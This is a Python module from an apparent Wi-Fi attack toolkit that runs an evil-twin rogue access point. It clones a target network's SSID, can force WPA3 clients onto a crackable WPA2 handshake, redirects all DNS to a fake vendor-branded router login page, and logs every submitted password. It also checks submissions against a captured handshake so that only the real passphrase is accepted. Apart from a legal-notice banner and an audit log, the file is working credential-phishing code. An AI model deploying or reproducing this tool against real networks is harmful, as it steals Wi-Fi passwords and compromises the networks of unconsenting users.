"""
PHANTOM AP — Signal Shadowing rogue access point module.

Three personalities:
  [1] Mirror  — beacon-identical clone of the target
  [2] Upgrade — same SSID, advertises WPA3 to trick clients expecting an upgrade
  [3] Stealth — cloned SSID, slightly stronger signal, passive handshake only

Captive portal uses vendor-matched login pages derived from OUI database.
Every credential submission is logged to captures/phantom_<timestamp>.log.
"""
from __future__ import annotations

import http.server
import json
import logging
import os
import re
import signal
import subprocess
import tempfile
import textwrap
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs, urlparse

from rich import box
from rich.console import Console
from rich.panel import Panel

from .exceptions import DependencyError
from .runner import SubprocessRunner
from modules import radio

logger = logging.getLogger(__name__)
console = Console()
_runner = SubprocessRunner()

CAPTURES_DIR = Path("captures")
PERSONALITY_MIRROR   = 1
PERSONALITY_UPGRADE  = 2
PERSONALITY_STEALTH  = 3
PERSONALITY_DOWNGRADE = 4   # WPA2-only clone of a WPA3-transition AP (SAE downgrade)


def downgrade_recommended(target: Optional[dict]) -> bool:
    """
    True if *target* is a WPA3 transition-mode AP — the case where a WPA2-only
    clone can coerce a WPA3-capable client onto the dictionary-crackable WPA2
    4-way (the SAE downgrade attack surface). Reads the scanner's
    ``security_tier`` / ``wpa3_downgrade_risk`` fields.
    """
    if not target:
        return False
    if target.get("wpa3_downgrade_risk"):
        return True
    tier = str(target.get("security_tier", "")).upper()
    return "TRANS" in tier

# ─── OUI vendor → portal template name ───────────────────────────────────────
_VENDOR_PORTAL_MAP: dict[str, str] = {
    "tp-link":  "tplink",
    "netgear":  "netgear",
    "asus":     "asus",
    "linksys":  "linksys",
    "d-link":   "dlink",
    "belkin":   "belkin",
    "cisco":    "cisco",
    "huawei":   "huawei",
    "zte":      "zte",
    "fritz":    "fritzbox",
}

_PORTAL_HTML: dict[str, str] = {}

def _build_portal_html(vendor_key: str, ssid: str) -> str:
    """Return a vendor-matched HTML login page."""
    templates: dict[str, tuple[str, str, str]] = {
        "tplink":   ("#008000", "TP-Link", "router"),
        "netgear":  ("#1a3c6e", "NETGEAR", "router"),
        "asus":     ("#1a1a1a", "ASUS",    "router"),
        "linksys":  ("#003876", "Linksys", "router"),
        "dlink":    ("#003399", "D-Link",  "router"),
        "belkin":   ("#7b2d8b", "Belkin",  "router"),
        "cisco":    ("#005073", "Cisco",   "router"),
        "huawei":   ("#cf0a2c", "HUAWEI",  "router"),
        "zte":      ("#003366", "ZTE",     "gateway"),
        "fritzbox": ("#e2001a", "FRITZ!Box","router"),
    }
    color, brand, device = templates.get(vendor_key, ("#333333", "Router", "router"))

    return textwrap.dedent(f"""\
    <!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>{brand} {device.title()} — Sign In</title>
    <style>
      body{{margin:0;padding:0;font-family:Arial,sans-serif;background:#f5f5f5;}}
      .hdr{{background:{color};color:#fff;padding:16px 24px;font-size:1.4em;font-weight:bold;}}
      .box{{max-width:400px;margin:60px auto;background:#fff;padding:32px;
            border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);}}
      h2{{margin-top:0;color:{color};font-size:1.1em;}}
      input{{width:100%;padding:10px;margin:8px 0 16px;box-sizing:border-box;
             border:1px solid #ccc;border-radius:3px;font-size:1em;}}
      button{{width:100%;padding:12px;background:{color};color:#fff;border:0;
              border-radius:3px;font-size:1em;cursor:pointer;}}
      .err{{color:#c00;font-size:.9em;margin-bottom:8px;display:none;}}
      .net{{color:#555;font-size:.85em;margin-bottom:16px;}}
    </style></head><body>
    <div class="hdr">{brand}</div>
    <div class="box">
      <h2>{device.title()} Admin — Sign In</h2>
      <p class="net">Network: <strong>{ssid}</strong></p>
      <p class="err" id="err">Incorrect password. Please try again.</p>
      <form method="POST" action="/submit">
        <label>Username</label>
        <input type="text" name="username" value="admin" autocomplete="username">
        <label>Password</label>
        <input type="password" name="password" placeholder="Router password"
               autocomplete="current-password">
        <button type="submit">Sign In</button>
      </form>
    </div>
    </body></html>
    """)


def _build_connecting_html() -> str:
    return textwrap.dedent("""\
    <!DOCTYPE html><html><head><meta charset="UTF-8">
    <title>Connecting...</title>
    <style>body{font-family:Arial,sans-serif;text-align:center;padding:80px;background:#f5f5f5;}
    .spinner{display:inline-block;width:40px;height:40px;border:4px solid #ccc;
             border-top-color:#00D4AA;border-radius:50%;animation:spin 1s linear infinite;}
    @keyframes spin{to{transform:rotate(360deg);}}</style>
    </head><body>
    <div class="spinner"></div>
    <h2 style="color:#333;margin-top:24px;">Connecting to network...</h2>
    <p style="color:#666;">Please wait while authentication is verified.</p>
    </body></html>
    """)


# ─── Captive portal HTTP handler ──────────────────────────────────────────────

class _PortalHandler(http.server.BaseHTTPRequestHandler):
    """Serves the vendor-matched captive portal and logs credential submissions."""

    log_file:   Path     = Path("captures/phantom_portal.log")
    portal_html: str     = ""
    ssid:        str     = ""
    _submit_count: dict[str, int] = {}  # MAC → attempt count (class-level shared)
    # When set (from a captured handshake), a submitted password is verified
    # against the real PSK in real time — see modules/pmkid.make_pmkid_verifier.
    verify_password: Optional[object] = None
    verified_password: Optional[str]  = None

    def log_message(self, fmt: str, *args: object) -> None:
        logger.debug("portal: " + fmt, *args)

    def _client_ip(self) -> str:
        return self.client_address[0]

    @classmethod
    def _evaluate(cls, passwd: str, attempt_num: int) -> tuple[Optional[bool], bool]:
        """
        Decide the portal's response to a submission. Returns
        ``(verified, show_connecting)``:

          • With a real verifier attached: ``verified`` is True/False from the
            crypto, and the victim only sees the "connecting" (success) page when
            the password is *actually correct* — a wrong guess genuinely gets
            "try again", exactly like the real router.
          • Without a verifier: legacy social-engineering heuristic — first
            attempt looks wrong, the second is accepted.
        """
        if cls.verify_password is not None:
            try:
                verified = bool(passwd) and bool(cls.verify_password(passwd))
            except Exception:
                verified = False
            return verified, verified
        return None, attempt_num >= 2

    def do_GET(self) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(self.portal_html.encode())

    def do_POST(self) -> None:
        length  = int(self.headers.get("Content-Length", 0))
        body    = self.rfile.read(length).decode(errors="replace")
        params  = parse_qs(body)
        user    = params.get("username", [""])[0]
        passwd  = params.get("password", [""])[0]
        ip      = self._client_ip()
        ua      = self.headers.get("User-Agent", "")
        ts      = datetime.now().isoformat(timespec="seconds")

        attempt_key = ip
        attempt_num = self.__class__._submit_count.get(attempt_key, 0) + 1
        self.__class__._submit_count[attempt_key] = attempt_num

        verified, show_connecting = self._evaluate(passwd, attempt_num)
        if verified:
            self.__class__.verified_password = passwd

        entry = {
            "timestamp":  ts,
            "ip":         ip,
            "user_agent": ua,
            "username":   user,
            "password":   passwd,
            "attempt":    attempt_num,
            "verified":   verified,           # True / False / None (no verifier)
        }
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        with open(self.log_file, "a") as fh:
            fh.write(json.dumps(entry) + "\n")

        logger.info("phantom: credential captured — ip=%s attempt=%d verified=%s",
                    ip, attempt_num, verified)
        if verified:
            console.print(
                f"  [bold green][PHANTOM ✓ VERIFIED][/bold green] Real PSK harvested "
                f"from [cyan]{ip}[/cyan]  password=[white]{passwd}[/white]"
            )
        else:
            tag = "rejected" if verified is False else "captured"
            console.print(
                f"  [bold green][PHANTOM][/bold green] Credential {tag} from "
                f"[cyan]{ip}[/cyan]  user=[white]{user}[/white]  attempt={attempt_num}"
            )

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        if show_connecting:
            # Correct password (or legacy 2nd attempt): show "connecting".
            self.wfile.write(_build_connecting_html().encode())
        else:
            # Wrong / first attempt: show "incorrect password, try again".
            html = self.portal_html.replace('display:none', 'display:block')
            self.wfile.write(html.encode())


# ─── hostapd / dnsmasq orchestration ─────────────────────────────────────────

def _write_hostapd_conf(
    iface: str, ssid: str, channel: int, personality: int,
    hw_mode: str = "g",
) -> Path:
    security_block = ""
    if personality == PERSONALITY_UPGRADE:
        security_block = textwrap.dedent("""\
        wpa=2
        wpa_key_mgmt=SAE
        rsn_pairwise=CCMP
        ieee80211w=2
        """)
    elif personality == PERSONALITY_DOWNGRADE:
        # WPA2-PSK only — no SAE. A WPA3-transition client that connects here
        # completes a WPA2 4-way whose M2 MIC is derived from the *real* PSK, so
        # the captured M1/M2 pair is dictionary-crackable. The passphrase is a
        # throwaway (auth fails at M3, but M1+M2 is already captured).
        security_block = textwrap.dedent("""\
        wpa=2
        wpa_key_mgmt=WPA-PSK
        rsn_pairwise=CCMP
        wpa_pairwise=CCMP
        wpa_passphrase=downgrade1234
        ieee80211w=0
        """)

    conf = textwrap.dedent(f"""\
    interface={iface}
    driver=nl80211
    ssid={ssid}
    hw_mode={hw_mode}
    channel={channel}
    macaddr_acl=0
    auth_algs=1
    ignore_broadcast_ssid=0
    {security_block}
    """)
    p = Path(tempfile.mktemp(suffix=".conf", prefix="phantom_hostapd_"))
    p.write_text(conf)
    return p


def _write_dnsmasq_conf(iface: str, gw_ip: str = "10.0.0.1") -> Path:
    conf = textwrap.dedent(f"""\
    interface={iface}
    dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
    dhcp-option=3,{gw_ip}
    dhcp-option=6,{gw_ip}
    server=8.8.8.8
    log-queries
    log-dhcp
    address=/#/{gw_ip}
    """)
    p = Path(tempfile.mktemp(suffix=".conf", prefix="phantom_dnsmasq_"))
    p.write_text(conf)
    return p


def _setup_ap_interface(mon_iface: str, ap_iface: str, gw_ip: str = "10.0.0.1") -> None:
    """Bring up the AP virtual interface and configure IP forwarding."""
    cmds = [
        ["ip", "link", "set", ap_iface, "up"],
        ["ip", "addr", "add", f"{gw_ip}/24", "dev", ap_iface],
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", mon_iface, "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "ACCEPT"],
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd, capture_output=True, timeout=10)
        except Exception as exc:
            logger.debug("ap interface setup: %s — %s", cmd, exc)

    # Enable IP forwarding
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1")
    except Exception:
        pass


def _teardown_ap_interface(ap_iface: str, gw_ip: str = "10.0.0.1") -> None:
    cmds = [
        ["ip", "addr", "del", f"{gw_ip}/24", "dev", ap_iface],
        ["ip", "link", "set", ap_iface, "down"],
        ["iptables", "-t", "nat", "-F"],
        ["iptables", "-F", "FORWARD"],
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd, capture_output=True, timeout=10)
        except Exception:
            pass
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text("0")
    except Exception:
        pass


# ─── Audit logging helper ─────────────────────────────────────────────────────

def _audit(event: str, bssid: str, personality: int, extra: Optional[dict] = None) -> None:
    import logging as _log
    _log.getLogger("modules.utils").info(
        "PHANTOM_AP event=%s bssid=%s personality=%d phantom_ap=True extra=%s",
        event, bssid, personality, json.dumps(extra or {}),
    )


# ─── Public API ───────────────────────────────────────────────────────────────

def phantom_menu(
    interface: str,
    target: Optional[dict],
    verify_hashfile: Optional[str] = None,
) -> None:
    """Interactive Phantom AP launcher. Called from CLI menu.

    If *verify_hashfile* points at a captured ``.hc22000`` for the target, the
    captive portal verifies every submitted password against the real PSK.
    """
    from .i18n import t

    console.print()
    console.print(Panel(
        "[bold #00D4AA]PHANTOM AP[/bold #00D4AA]\n\n"
        "[bold orange3]⚠  Legal Notice  ⚠[/bold orange3]\n"
        "Creating a rogue access point is illegal without explicit written authorization\n"
        "from the network owner. This operation is logged to the tamper-evident audit chain.\n\n"
        "[bold white]Only proceed on networks you own or have written permission to test.[/bold white]",
        box=box.DOUBLE,
        border_style="orange3",
        padding=(1, 2),
    ))
    console.print()

    if not target:
        console.print("[red]  No target selected. Scan first.[/red]")
        return

    bssid   = target.get("bssid", "")
    ssid    = target.get("ssid", "UNKNOWN")
    channel = int(target.get("channel", 6) or 6)
    vendor  = (target.get("vendor") or "").lower()

    # ── Personality selection ─────────────────────────────────────────────
    dg_hint = ("  [green](recommended: this is a WPA3 transition AP)[/green]"
               if downgrade_recommended(target) else "")
    console.print(
        f"  Target: [cyan]{ssid}[/cyan]  [dim]{bssid}[/dim]  CH{channel}\n"
        "\n  Select Phantom AP personality:\n"
        "  [1] Mirror   — beacon-identical clone (copies channel, rates, WMM)\n"
        "  [2] Upgrade  — same SSID, advertises WPA3 (lures upgrade-expecting clients)\n"
        "  [3] Stealth  — cloned SSID, no portal, passive handshake capture\n"
        f"  [4] Downgrade — WPA2-only clone; coerces WPA3 clients onto a crackable "
        f"WPA2 4-way{dg_hint}\n"
    )
    try:
        choice = int(input("  Personality [1]: ").strip() or "1")
        if choice not in (1, 2, 3, 4):
            choice = 1
    except (ValueError, KeyboardInterrupt):
        choice = 1

    personality = choice

    # ── Check dependencies ────────────────────────────────────────────────
    missing = []
    for tool in ("hostapd", "dnsmasq"):
        if not __import__("shutil").which(tool):
            missing.append(tool)
    if missing:
        console.print(f"[red]  Missing required tools: {', '.join(missing)}[/red]")
        console.print("  Install with:  sudo apt install " + " ".join(missing))
        return

    _audit("start", bssid, personality, {"ssid": ssid, "channel": channel, "personality": personality})

    try:
        _run_phantom(
            monitor_iface=interface,
            bssid=bssid,
            ssid=ssid,
            channel=channel,
            personality=personality,
            vendor=vendor,
            verify_hashfile=verify_hashfile,
        )
    except KeyboardInterrupt:
        console.print("\n  [yellow]Phantom AP interrupted.[/yellow]")
    except Exception as exc:
        console.print(f"  [red]Phantom AP error: {exc}[/red]")
        logger.exception("Phantom AP error")
    finally:
        _audit("stop", bssid, personality)


def _run_phantom(
    monitor_iface: str,
    bssid: str,
    ssid: str,
    channel: int,
    personality: int,
    vendor: str,
    verify_hashfile: Optional[str] = None,
) -> None:
    """
    Core Phantom AP runner.
    Starts hostapd + dnsmasq + captive portal, blocks until Ctrl+C.
    """
    import shutil

    AP_IFACE  = "phantom0"
    GW_IP     = "10.0.0.1"
    PORTAL_PORT = 80
    LOG_TS    = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path  = CAPTURES_DIR / f"phantom_{LOG_TS}.log"
    CAPTURES_DIR.mkdir(exist_ok=True)

    # ── Create AP virtual interface ───────────────────────────────────────
    console.print(f"\n  [cyan][*][/cyan] Creating AP interface [white]{AP_IFACE}[/white]...")
    try:
        subprocess.run(
            ["iw", "dev", monitor_iface, "interface", "add", AP_IFACE, "type", "__ap"],
            capture_output=True, timeout=10,
        )
    except Exception as exc:
        logger.debug("iw add interface: %s", exc)

    _setup_ap_interface(monitor_iface, AP_IFACE, GW_IP)

    # ── Write config files ────────────────────────────────────────────────
    hostapd_conf = _write_hostapd_conf(AP_IFACE, ssid, channel, personality)
    dnsmasq_conf = _write_dnsmasq_conf(AP_IFACE, GW_IP)

    # ── Determine vendor portal ───────────────────────────────────────────
    vendor_key = "generic"
    for key in _VENDOR_PORTAL_MAP:
        if key in vendor:
            vendor_key = _VENDOR_PORTAL_MAP[key]
            break
    portal_html = _build_portal_html(vendor_key, ssid)

    # ── Start hostapd ─────────────────────────────────────────────────────
    console.print(f"  [cyan][*][/cyan] Starting hostapd (personality {personality})...")
    hostapd_proc = radio.spawn(
        ["hostapd", str(hostapd_conf)],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(2)
    if hostapd_proc.poll() is not None:
        stderr = (hostapd_proc.stderr.read() or b"").decode(errors="replace")
        console.print(f"  [red]hostapd failed to start: {stderr[:200]}[/red]")
        _cleanup_phantom(AP_IFACE, hostapd_conf, dnsmasq_conf, None, None)
        return

    # ── Start dnsmasq ─────────────────────────────────────────────────────
    console.print(f"  [cyan][*][/cyan] Starting dnsmasq (DHCP + DNS redirect)...")
    dnsmasq_proc = radio.spawn(
        ["dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1)

    # ── Captive portal (Stealth skips portal) ─────────────────────────────
    portal_thread: Optional[threading.Thread] = None
    httpd: Optional[http.server.HTTPServer] = None

    # If the operator already captured a handshake/PMKID for this target, build
    # a real-time verifier so the portal confirms the true PSK instead of
    # logging blind guesses.
    verifier = None
    if verify_hashfile:
        try:
            from modules.pmkid import make_pmkid_verifier
            verifier = make_pmkid_verifier(verify_hashfile)
        except Exception as exc:
            logger.debug("portal verifier unavailable: %s", exc)
        if verifier:
            console.print("  [green][+][/green] Live PSK verification "
                          "[dim](portal confirms the real password)[/dim]")
        else:
            console.print("  [yellow][~][/yellow] No PMKID in capture — portal "
                          "runs in blind-capture mode")

    if personality != PERSONALITY_STEALTH:
        class Handler(_PortalHandler):
            log_file        = log_path
            portal_html     = portal_html  # type: ignore[assignment]
            verify_password = staticmethod(verifier) if verifier else None
            verified_password = None

        try:
            httpd = http.server.HTTPServer(("", PORTAL_PORT), Handler)
            portal_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
            portal_thread.start()
            console.print(
                f"  [green][+][/green] Captive portal online — "
                f"credentials → [white]{log_path}[/white]"
            )
        except PermissionError:
            console.print(f"  [yellow][!][/yellow] Port {PORTAL_PORT} in use — portal disabled")

    console.print()
    personality_names = {1: "Mirror", 2: "Upgrade", 3: "Stealth"}
    console.print(Panel(
        f"[bold #00D4AA]PHANTOM AP ACTIVE[/bold #00D4AA]\n\n"
        f"  SSID:        [cyan]{ssid}[/cyan]\n"
        f"  BSSID:       [dim]{bssid}[/dim]\n"
        f"  Channel:     {channel}\n"
        f"  Personality: [white]{personality_names[personality]}[/white]\n"
        f"  Portal log:  [dim]{log_path}[/dim]\n\n"
        "[dim]Press Ctrl+C to stop and restore interface.[/dim]",
        border_style="#00D4AA",
    ))

    try:
        while True:
            time.sleep(1)
            if hostapd_proc.poll() is not None:
                console.print("  [yellow][!] hostapd exited unexpectedly.[/yellow]")
                break
    finally:
        _cleanup_phantom(AP_IFACE, hostapd_conf, dnsmasq_conf, hostapd_proc, dnsmasq_proc)
        if httpd:
            httpd.shutdown()
        console.print("  [cyan][*][/cyan] Phantom AP stopped. Interface restored.")


def _cleanup_phantom(
    ap_iface: str,
    hostapd_conf: Path,
    dnsmasq_conf: Path,
    hostapd_proc: Optional[subprocess.Popen],
    dnsmasq_proc: Optional[subprocess.Popen],
) -> None:
    for proc in (hostapd_proc, dnsmasq_proc):
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

    _teardown_ap_interface(ap_iface)

    for conf_file in (hostapd_conf, dnsmasq_conf):
        try:
            conf_file.unlink(missing_ok=True)
        except Exception:
            pass

    try:
        subprocess.run(
            ["iw", "dev", ap_iface, "del"],
            capture_output=True, timeout=10,
        )
    except Exception:
        pass
